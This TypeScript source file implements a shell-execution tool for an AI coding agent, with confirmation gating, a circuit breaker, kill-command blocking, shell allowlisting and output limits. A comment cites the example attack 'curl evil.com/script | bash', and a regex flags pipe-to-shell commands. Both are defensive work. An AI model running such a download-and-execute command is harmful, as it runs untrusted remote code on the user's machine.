import { spawn } from 'node:child_process';
import * as os from 'node:os';
import type { Tool, ToolStreamEvent } from '@wrongstack/core';
import { buildChildEnv } from './_env.js';
import { createOutputSpool, spoolNote } from './_output-spool.js';
import { normalizeCommandOutput } from './_util.js';
import { killWin32Tree, redactCommand } from './process-registry.js';
import { getProcessRegistry } from './process-registry.js';
import { checkAndBlockKillCommand } from './bash-kill-guard.js';
import { pickShell, shellArgs, type BashShell } from './_shell-pick.js';
import { resolvePowerShell } from './_win32-resolve.js';

interface BashInput {
  command: string;
  timeout_ms?: number | undefined;
  background?: boolean | undefined;
}

interface BashOutput {
  output: string;
  exit_code: number | null;
  timed_out: boolean;
  pid?: number | null | undefined;
  error?: string | undefined;
}

const MAX_OUTPUT = 32_768;
// 32 KB — keeps context manageable for arbitrary commands. bash output
// is typically unbounded LLM tool-use context; larger caps risk pushing
// the context window to compaction on every invocation.

// 5 minutes — generous enough for most real-world commands (npm install,
// docker build, etc.) without letting a hung process consume the session.
// The per-call timeout_ms parameter still allows precise overrides.
// The circuit breaker's slow-call threshold (180s) sits below this so
// commands that run >3min still count as "slow" and can trip the breaker
// after 3 occurrences.
const DEFAULT_TIMEOUT_MS = 300_000;

// Flush partial_output every 200ms or when 4 KiB accumulates — whichever
// comes first. Smaller batches make the TUI feel responsive; larger ones
// keep EventBus traffic reasonable on chatty processes.
const STREAM_FLUSH_INTERVAL_MS = 200;
const STREAM_FLUSH_BYTES = 4 * 1024;

// Maximum chunks buffered between the child's data handlers and the
// streaming consumer before the pipes are paused (backpressure). Without
// this, a consumer that stalls — or a generator that was torn down while a
// (grand)child keeps writing — lets `queue`/`pending` grow without bound
// and can OOM the host process.
const MAX_QUEUE_CHUNKS = 500;

export const bashTool: Tool<BashInput, BashOutput> = {
  name: 'bash',
  category: 'Shell',
  description:
    'Execute an arbitrary command in the user\'s default shell (bash/zsh/pwsh/cmd). ' +
    'stdout and stderr are merged into one stream. This is the most powerful and dangerous tool — ' +
    'it gives the model full access to the developer\'s machine. Prefer specialized tools whenever possible.',
  usageHint:
    'SECURITY WARNING: This tool runs with the full privileges of the current user.\n\n' +
    'Best practices for the model:\n' +
    '- Strongly prefer `exec` for known safe commands (node, npm, pnpm, tsc, git, etc.).\n' +
    '- Use bash only when you genuinely need shell features (pipes, redirection, complex one-liners).\n' +
    '- Prefer single focused commands over huge `&&` chains.\n' +
    '- Use `background: true` only for long-running processes (dev servers, watchers).\n' +
    '- The working directory is the project root.\n' +
    '- Output may be truncated in the middle for very large results.',
  permission: 'confirm',
  mutating: true,
  riskTier: 'destructive',
  icon: 'terminal',
  // Trust rules match on the literal `command` string. Without subjectKey
  // the policy heuristic would have done the same here, but declaring it
  // explicitly removes the implicit cross-tool aliasing.
  subjectKey: 'command',
  capabilities: ['shell.arbitrary'],
  timeoutMs: 300_000,
  maxOutputBytes: MAX_OUTPUT,
  estimatedDurationMs: 30_000,
  inputSchema: {
    type: 'object',
    properties: {
      command: {
        type: 'string',
        description: 'The exact shell command to run. Prefer simple, focused commands.',
      },
      timeout_ms: {
        type: 'integer',
        description: 'Optional timeout for this specific command in milliseconds.',
      },
      background: {
        type: 'boolean',
        description: 'If true, launch the process in the background and return the PID immediately.',
      },
    },
    required: ['command'],
  },
  async execute(input, ctx, opts) {
    let final: BashOutput | undefined;
    const executeStream = bashTool.executeStream;
    if (!executeStream) throw new Error('bashTool: stream execution unavailable');
    for await (const ev of executeStream(input, ctx, opts)) {
      if (ev.type === 'final') final = ev.output;
    }
    if (!final) throw new Error('bash: stream ended without final event');
    return final;
  },
  async *executeStream(input, ctx, opts): AsyncGenerator<ToolStreamEvent<BashOutput>> {
    if (!input?.command) throw new Error('bash: command is required');

    const registry = getProcessRegistry();
    // Background processes bypass the circuit breaker — they are fire-and-forget
    // and should not affect breaker state. This allows background vitest, dev
    // servers, etc. to run even when the breaker is open.
    const bypassBreaker = !!input.background;
    if (!registry.beforeCall(bypassBreaker)) {
      yield {
        type: 'final',
        output: {
          output: '',
          exit_code: 1,
          timed_out: false,
          pid: null,
          error:
            'bash: circuit breaker open — too many consecutive failures or slow calls. Use /kill to inspect or /kill reset to recover.',
        },
      };
      return;
    }

    // Kill protection: block commands that try to kill protected WrongStack processes
    // This includes direct kill commands, bash -c wrapped kills, and name-based kills (pkill, killall)
    const killCheck = await checkAndBlockKillCommand(input.command);
    if (killCheck.blocked) {
      yield {
        type: 'final',
        output: {
          output: '',
          exit_code: 1,
          timed_out: false,
          pid: null,
          error: killCheck.reason || 'Kill command blocked: targets a protected WrongStack process.',
        },
      };
      return;
    }

    // Security: detect and warn about pipe-to-shell patterns that could lead to
    // arbitrary code execution (e.g., "curl evil.com/script | bash"). This pattern
    // is particularly dangerous because the user confirms a seemingly innocuous command
    // but the downloaded script executes arbitrary code.
    const PIPE_TO_SHELL_PATTERN = /\|\s*(sh|bash|ksh|zsh|fish|cmd|powershell|pwsh)/i;
    if (PIPE_TO_SHELL_PATTERN.test(input.command)) {
      console.warn(JSON.stringify({
        level: 'warn',
        event: 'bash.pipe_to_shell_detected',
        message: 'Detected pipe-to-shell pattern. Consider reviewing the full command before confirming.',
        command_prefix: input.command.slice(0, 100), // Log first 100 chars for review
        timestamp: new Date().toISOString(),
      }));
    }

    const timeoutMs = Math.max(1, Math.min(input.timeout_ms ?? DEFAULT_TIMEOUT_MS, 600_000));

    const isWin = os.platform() === 'win32';
    // Shell selection:
    //   - POSIX: existing behavior — `WRONGSTACK_SHELL` override, else `$SHELL`
    //     if it names an allowlisted shell, else `/bin/bash`. cmd.exe-style
    //     semantics don't apply on POSIX.
    //   - Windows: delegate to `pickShell`, which honours `WRONGSTACK_SHELL`
    //     (when set to cmd|powershell|pwsh), auto-detects PowerShell-style
    //     commands (so Codex-style `Get-Content`/`Set-Location`/etc. work
    //     without forcing every user to set an env var), and falls back to
    //     `cmd.exe` for legacy scripts. The `BashShell` sentinel is then
    //     mapped to the actual binary path below.
    //
    // The user-controllable `SHELL` and `COMSPEC` env vars are NOT trusted
    // — a user (or another agent) could point them at an arbitrary binary on
    // shared systems. Only `WRONGSTACK_SHELL` (and the hard-coded defaults
    // in `_shell-pick.ts` / this block) are honoured.
    type ShellPlan = {
      /** Binary path passed to spawn(). */
      bin: string;
      /** argv prefix (everything except the inline command). */
      argv: readonly string[];
      /** When true, write `input.command` to the child's stdin instead of
       *  passing it as an argv. PowerShell uses this because quotes and
       *  dollar-signs can break `-Command "..."` quoting; `pwsh -Command -`
       *  reads the script from stdin verbatim. */
      useStdin: boolean;
    };
    let plan: ShellPlan;
    if (isWin) {
      const shell: BashShell = pickShell('win32', input.command, {
        get: (k) => process.env[k],
      });
      // Resolve a sensible default binary. `pickShell` decided the shell
      // kind, but the actual spawn uses a real path:
      //   - 'cmd'         → COMSPEC or `cmd.exe`. The user can override
      //                    via WRONGSTACK_SHELL=cmd (already handled by
      //                    pickShell).
      //   - 'powershell'  → `powershell.exe` (Windows PS 5.1).
      //   - 'pwsh'        → `pwsh.exe` (PS 7+) if installed, else fall
      //                    back to `powershell.exe`. We don't probe the
      //                    filesystem here; _win32-resolve.ts does the
      //                    PATHEXT walk at spawn time and surfaces ENOENT
      //                    cleanly if PowerShell is not installed.
      // `resolvePowerShell` walks PATH/PATHEXT to find the binary (PS 7 is
      // not always on PATH; legacy PS 5.1 is in System32). For 'cmd' we let
      // Node's own PATH search handle COMSPEC — `cmd.exe` is always on
      // System32 which is in PATH by default.
      const bin =
        shell === 'powershell'
          ? resolvePowerShell('powershell.exe')
          : shell === 'pwsh'
            ? resolvePowerShell('pwsh.exe')
            : process.env['COMSPEC'] ?? 'cmd.exe';
      plan = {
        bin,
        argv: shellArgs(shell),
        useStdin: shell === 'powershell' || shell === 'pwsh',
      };
    } else {
      // POSIX: use WRONGSTACK_SHELL if set; else honor $SHELL only when it
      // names an allowlisted shell (bash/zsh/sh/dash/fish); else /bin/bash.
      const explicit = process.env['WRONGSTACK_SHELL'];
      let bin: string;
      if (explicit) bin = explicit;
      else {
        const fromEnv = process.env['SHELL'];
        if (fromEnv) {
          const name = fromEnv.split('/').pop() ?? '';
          if (['bash', 'zsh', 'sh', 'dash', 'fish'].includes(name)) bin = fromEnv;
          else bin = '/bin/bash';
        } else bin = '/bin/bash';
      }
      plan = { bin, argv: ['-c'], useStdin: false };
    }
    const shell = plan.bin;
    const args = plan.useStdin ? [...plan.argv] : [...plan.argv, input.command];

    const env = buildChildEnv(ctx.session?.id);

    // On POSIX we put the shell in its own process group so that timeout /
    // abort can kill the entire group with `process.kill(-pid)`. Otherwise
    // `bash -c "sleep 9999 & disown"` would leave the grandchild running.
    // Never on Windows: timeouts tree-kill via taskkill /T instead, and
    // DETACHED_PROCESS would void windowsHide (grandchildren would pop
    // visible console windows — see the background-mode spawn below).
    const detached = !isWin;

    const startedAt = Date.now();

    if (input.background) {
      // Background mode: capture stdout/stderr with bounded buffers so a
      // malicious command can't write unbounded output. Apply MAX_OUTPUT cap.
      let buf = '';
      let truncated = false;
      const child = spawn(shell, args, {
        cwd: ctx.projectRoot,
        env,
        // PowerShell takes the script on stdin (no argv quoting); cmd.exe
        // and POSIX shells ignore stdin when given the command inline.
        stdio: [plan.useStdin ? 'pipe' : 'ignore', 'pipe', 'pipe'],
        // win32: CreateProcess IGNORES CREATE_NO_WINDOW (windowsHide) when
        // DETACHED_PROCESS (detached: true) is set, so the console-less
        // cmd.exe's grandchildren (node, dev servers) each allocate a fresh
        // VISIBLE console window. detached: false lets CREATE_NO_WINDOW
        // apply: the child gets a hidden console that grandchildren inherit.
        // Windows children survive parent exit either way. POSIX keeps
        // detached for the process-group kill semantics.
        detached: !isWin,
        windowsHide: true,
      });
      // PowerShell: stream the script to stdin and close. We do this AFTER
      // spawn() returns because `child.stdin` is only available then. The
      // write is buffered in the OS pipe; pwsh reads it as it boots. Closing
      // stdin is what tells pwsh "end of script" — without an .end(), the
      // pipe stays open and pwsh waits forever for more input.
      if (plan.useStdin) {
        try {
          child.stdin?.write(input.command);
          child.stdin?.end();
        } catch {
          /* spawn already errored — the error handler below will fire */
        }
      }
      const pid = child.pid;
      if (typeof pid === 'number') {
        registry.register({
          pid,
          name: 'bash',
          command: redactCommand(input.command),
          startedAt: Date.now(),
          sessionId: ctx.session?.id,
          child,
        });
        // Register the close handler on the same tick as spawn() so the
        // handler is guaranteed to be in place before Node's event loop
        // can deliver the close event.
        child.on('close', () => registry.unregister(pid));
      }
      const onBgData = (chunk: Buffer) => {
        if (truncated) return;
        const remain = MAX_OUTPUT - buf.length;
        if (remain > 0) {
          buf += chunk.toString().slice(0, remain);
        }
        if (buf.length >= MAX_OUTPUT) {
          truncated = true;
          // Cap reached — stop accumulating. The streams stay in flowing
          // mode so the rest of the output is read and discarded (pausing
          // would fill the OS pipe buffer and block the background process).
          child.stdout?.off('data', onBgData);
          child.stderr?.off('data', onBgData);
        }
      };
      child.stdout?.on('data', onBgData);
      child.stderr?.on('data', onBgData);
      const cleanupBackground = () => {
        child.stdout?.off('data', onBgData);
        child.stderr?.off('data', onBgData);
      };
      child.on('error', () => {
        cleanupBackground();
        if (typeof pid === 'number') registry.unregister(pid);
        registry.afterCall(Date.now() - startedAt, true, bypassBreaker);
      });
      // The pipe handles would otherwise keep the parent's event loop alive
      // for as long as the background process runs — child.unref() alone
      // does not release stdio. A one-shot (--print) run could never exit
      // while a background dev server kept its pipes open.
      child.on('close', () => {
        cleanupBackground();
        registry.afterCall(Date.now() - startedAt, false, bypassBreaker);
      });
      if (typeof pid === 'number') child.unref(); // unref() so the event loop can exit while this background process runs.
      yield {
        type: 'final',
        output: {
          output: normalizeCommandOutput(buf),
          exit_code: null,
          timed_out: false,
          pid,
        },
      };
      return;
    }

    // Foreground mode: pipe stdout/stderr for streaming output.
    // On Windows the abort signal is handled manually below instead of being
    // passed to spawn(): Node's built-in handling kills only the direct
    // child (cmd.exe), which destroys taskkill's parent-pid tree enumeration
    // and orphans the actual command (node/vitest/dev server). The orphan
    // keeps the inherited stdio pipes open and streams into this process
    // for the rest of the session.
    const child = spawn(shell, args, {
      cwd: ctx.projectRoot,
      env,
      // PowerShell takes the script on stdin (no argv quoting); cmd.exe
      // and POSIX shells ignore stdin when given the command inline.
      stdio: [plan.useStdin ? 'pipe' : 'ignore', 'pipe', 'pipe'],
      detached,
      windowsHide: true,
      ...(isWin ? {} : { signal: opts.signal }),
    });
    // PowerShell: stream the script to stdin and close. We do this AFTER
    // spawn() returns because `child.stdin` is only available then. The
    // write is buffered in the OS pipe; pwsh reads it as it boots. Closing
    // stdin is what tells pwsh "end of script" — without an .end(), the
    // pipe stays open and pwsh waits forever for more input.
    if (plan.useStdin) {
      try {
        child.stdin?.write(input.command);
        child.stdin?.end();
      } catch {
        /* spawn already errored — the error handler below will fire */
      }
    }

    // Register with global registry so Ctrl+C / /kill can find and kill it.
    const pid = child.pid;
    if (typeof pid === 'number') {
      registry.register({
        pid,
        name: 'bash',
        command: redactCommand(input.command),
        startedAt: Date.now(),
        sessionId: ctx.session?.id,
        child,
      });
    }

    let buf = '';
    let pending = '';
    let timedOut = false;
    const timers: NodeJS.Timeout[] = [];
    // Full-output spool: `buf` keeps only the first MAX_OUTPUT bytes for the
    // model; everything else used to be dropped. The spool streams the FULL
    // output to a file once it exceeds the cap, and the final result carries
    // a marker pointing at it — file-based instead of in-memory/in-context.
    const spool = createOutputSpool({ tool: 'bash', thresholdBytes: MAX_OUTPUT });

    function killWithTimeout(
      child: ReturnType<typeof spawn>,
      timeoutMs: number,
    ): void {
      if (isWin) {
        // Tree-kill so grandchildren of the shell die too. Direct kill only
        // as a delayed fallback — killing cmd.exe first would break
        // taskkill's tree enumeration and orphan the real command.
        if (typeof child.pid === 'number' && child.exitCode === null && killWin32Tree(child.pid)) {
          const fallback = setTimeout(() => {
            if (child.exitCode === null) {
              try { child.kill(); } catch { /* ignore */ }
            }
          }, 2000);
          timers.push(fallback);
          fallback.unref?.();
        } else {
          try { child.kill(); } catch { /* ignore */ }
        }
        return;
      }

      // Best-effort SIGTERM: try process-group kill first, fall back to child.kill.
      try {
        if (typeof child.pid === 'number') {
          try { process.kill(-child.pid, 'SIGTERM'); }
          catch { child.kill('SIGTERM'); }
        } else {
          child.kill('SIGTERM');
        }
      } catch { /* ignore */ }

      // After timeoutMs, assert-kill with SIGKILL.
      const killTimer = setTimeout(() => {
        try {
          if (typeof child.pid === 'number') {
            try { process.kill(-child.pid, 'SIGKILL'); }
            catch { child.kill('SIGKILL'); }
          } else {
            child.kill('SIGKILL');
          }
        } catch { /* ignore */ }
      }, timeoutMs);
      timers.push(killTimer);
      killTimer.unref?.();
    }

    const timer = setTimeout(() => {
      timedOut = true;
      killWithTimeout(child, 2000);
    }, timeoutMs);
    timers.push(timer);
    timer.unref?.();

    // Windows abort handling (see the spawn() comment above): tree-kill on
    // abort while the shell is still alive so its grandchildren die with it.
    const onAbort = () => killWithTimeout(child, 2000);
    if (isWin) {
      if (opts.signal.aborted) onAbort();
      else opts.signal.addEventListener('abort', onAbort, { once: true });
    }

    // Bridge the EventEmitter-style child to an async iterator.
    type Chunk =
      | { kind: 'data'; text: string }
      | { kind: 'end'; code: number | null }
      | { kind: 'error'; err: Error };
    const queue: Chunk[] = [];
    let resolveNext: ((c: Chunk) => void) | null = null;
    const push = (c: Chunk) => {
      if (resolveNext) {
        const r = resolveNext;
        resolveNext = null;
        r(c);
      } else {
        queue.push(c);
      }
    };
    const next = (): Promise<Chunk> =>
      new Promise((resolve) => {
        const c = queue.shift();
        if (c) resolve(c);
        else resolveNext = resolve;
      });

    let lastFlush = Date.now();
    const flush = () => {
      if (pending.length === 0) return null;
      const text = pending;
      pending = '';
      lastFlush = Date.now();
      return text;
    };

    // Backpressure: when the consumer falls behind, pause the pipes instead
    // of letting `queue`/`pending` grow without bound. The child eventually
    // blocks on write, which is the correct pressure signal.
    let paused = false;
    const pauseIfFlooded = () => {
      if (!paused && queue.length >= MAX_QUEUE_CHUNKS) {
        paused = true;
        child.stdout?.pause();
        child.stderr?.pause();
      }
    };
    const resumeIfDrained = () => {
      if (paused && queue.length < MAX_QUEUE_CHUNKS) {
        paused = false;
        child.stdout?.resume();
        child.stderr?.resume();
      }
    };
    const onData = (chunk: Buffer) => {
      const text = chunk.toString();
      // Cap buf during accumulation to prevent heap exhaustion from unbounded
      // string growth. exec.ts uses the same pattern. The final output is
      // further normalized via normalizeCommandOutput which already caps at
      // MAX_OUTPUT (32 KB). The spool captures the FULL output on disk.
      if (buf.length < MAX_OUTPUT) {
        buf += text.slice(0, MAX_OUTPUT - buf.length);
      }
      spool.write(text);
      pending += text;
      push({ kind: 'data', text });
      pauseIfFlooded();
    };
    child.stdout?.on('data', onData);
    child.stderr?.on('data', onData);

    child.on('error', (err) => {
      for (const t of timers) clearTimeout(t);
      registry.afterCall(Date.now() - startedAt, true);
      push({ kind: 'error', err });
    });
    child.on('close', (code) => {
      for (const t of timers) clearTimeout(t);
      if (typeof pid === 'number') registry.unregister(pid);
      registry.afterCall(Date.now() - startedAt, code !== 0 && code !== null);
      push({ kind: 'end', code });
    });

    try {
      while (true) {
        const c = await next();
        resumeIfDrained();
        if (c.kind === 'error') throw c.err;
        if (c.kind === 'end') {
          const remainder = flush();
          if (remainder !== null) {
            yield { type: 'partial_output', text: remainder };
          }
          const spooled = spool.finalize();
          yield {
            type: 'final',
            output: {
              output: normalizeCommandOutput(buf) + (spooled ? spoolNote(spooled) : ''),
              exit_code: c.code,
              timed_out: timedOut,
            },
          };
          return;
        }
        const now = Date.now();
        if (pending.length >= STREAM_FLUSH_BYTES || now - lastFlush >= STREAM_FLUSH_INTERVAL_MS) {
          const text = flush();
          if (text) yield { type: 'partial_output', text };
        }
      }
    } finally {
      for (const t of timers) clearTimeout(t);
      spool.finalize(); // idempotent — closes the file if the stream was abandoned
      if (isWin) opts.signal.removeEventListener('abort', onAbort);
      // Teardown: this generator can be abandoned mid-stream (executor
      // timeout, abort, consumer error). The data handlers above would
      // otherwise stay attached and keep appending to `pending`/`queue`
      // with no consumer — on Windows a shell grandchild that survived
      // child.kill() can feed the orphaned pipes for the rest of the
      // session, growing the host heap until OOM. Detach the handlers,
      // destroy the pipes, and make sure nothing is still running.
      child.stdout?.off('data', onData);
      child.stderr?.off('data', onData);
      child.stdout?.destroy();
      child.stderr?.destroy();
      if (child.exitCode === null && !child.killed) {
        if (typeof pid === 'number') registry.kill(pid, { force: true });
        else killWithTimeout(child, 2000);
      }
    }
  },
};

// Re-export types so consumers can narrow on stream events.
export type { BashInput, BashOutput };
